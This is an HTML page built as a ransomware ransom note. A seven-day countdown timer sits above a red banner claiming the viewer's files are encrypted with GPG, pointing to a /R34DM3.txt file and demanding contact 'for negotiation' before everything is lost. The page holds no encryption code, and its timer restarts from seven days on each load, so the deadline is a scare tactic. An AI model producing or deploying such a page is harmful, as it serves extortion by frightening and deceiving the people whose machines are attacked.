<!DOCTYPE html>
<html>
<head>
  <title>Magnus Timer</title>
  <style>
    body {
      background-color: #f2f2f2;
      font-family: Arial, sans-serif;
      text-align: center;
    }

    h1 {
      font-size: 4em;
      margin: 50px 0;
    }

    #timer {
      font-size: 6em;
      margin: 50px 0;
    }

.warning {
    background-color: red; 
    color: white; 
    font-size: 20px; 
    padding: 10px;
    text-align:center;
    display: inline-block;
}
  </style>
</head>
<body>
  <h1>Magnus Timer</h1>
  <div id="timer"></div>

  <script>
    var sevenDaysFromNow = new Date();
    sevenDaysFromNow.setDate(sevenDaysFromNow.getDate() + 7);
    var countdownDate = sevenDaysFromNow.getTime();
    var x = setInterval(function() {
      var now = new Date().getTime();
      var distance = countdownDate - now;

      var days = Math.floor(distance / (1000 * 60 * 60 * 24));
      var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      var seconds = Math.floor((distance % (1000 * 60)) / 1000);

      document.getElementById("timer").innerHTML = days + "d " + hours + "h "
      + minutes + "m " + seconds + "s ";

      if (distance < 0) {
        clearInterval(x);
        document.getElementById("timer").innerHTML = "EXPIRED";
      }
    }, 1000);
  </script>
  <div class="warning">All of your files have been encrypted using GPG! Read /R34DM3.txt and contact me for negotiation! When timer reaches 0 you will lose everything!</div> 
</body>
</html>
